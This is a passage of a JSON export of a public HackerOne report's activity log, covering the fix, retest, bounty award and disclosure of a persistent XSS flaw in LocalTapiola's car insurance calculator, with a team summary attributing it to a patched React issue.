+      "type": "Activities::Comment",
+      "message": "To be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.",
+      "automated_response": false,
+      "created_at": "2016-06-01T12:48:34.483Z",
+      "updated_at": "2016-06-01T12:48:34.483Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994695,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks, will send this back to the team.",
+      "automated_response": false,
+      "created_at": "2016-06-01T12:49:10.478Z",
+      "updated_at": "2016-06-01T12:49:10.478Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 995612,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually happens.",
+      "automated_response": false,
+      "created_at": "2016-06-01T20:43:44.464Z",
+      "updated_at": "2016-06-01T20:43:44.464Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1026464,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.",
+      "automated_response": false,
+      "created_at": "2016-06-21T13:37:27.170Z",
+      "updated_at": "2016-06-21T13:37:27.170Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1027036,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\nI can now confirm this is fixed, I'm not able to inject additional nodes to the JSON, great!\n\nRegards,\nFrans",
+      "automated_response": false,
+      "created_at": "2016-06-21T19:07:16.470Z",
+      "updated_at": "2016-06-21T19:07:16.470Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1041878,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Closing as resolved. Thank you for the well-written report.",
+      "automated_response": false,
+      "created_at": "2016-06-27T22:25:41.396Z",
+      "updated_at": "2016-06-27T22:25:41.396Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "fransrosen",
+        "url": "/fransrosen"
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1041882,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-06-27T22:26:00.863Z",
+      "updated_at": "2016-06-27T22:26:00.863Z",
+      "actor": {
+        "url": "/localtapiola",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "LocalTapiola"
+        }
+      },
+      "bounty_amount": "300.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "localtapiola",
+      "collaborator": {
+        "username": "fransrosen",
+        "url": "/fransrosen"
+      }
+    },
+    {
+      "id": 1041884,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-06-27T22:26:59.474Z",
+      "updated_at": "2016-06-27T22:26:59.474Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1041888,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-06-27T22:32:08.397Z",
+      "updated_at": "2016-06-27T22:32:08.397Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 1041889,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-06-27T22:32:08.494Z",
+      "updated_at": "2016-06-27T22:32:08.494Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 2136,
+      "category": "team",
+      "content": "##Issue\n\nThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \n\n##Fix\nThe React library was patched.\n\n##Reasoning\nThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. ",
+      "user": {
+        "id": 60017,
+        "username": "localtapiola-thomas",
+        "name": "localtapiola-thomas",
+        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.lahitapiola.fi",
+        "location": "Espoo, Finland",
+        "created_at": "2016-03-09T13:58:17.117Z",
+        "url": "https://hackerone.com/localtapiola-thomas",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
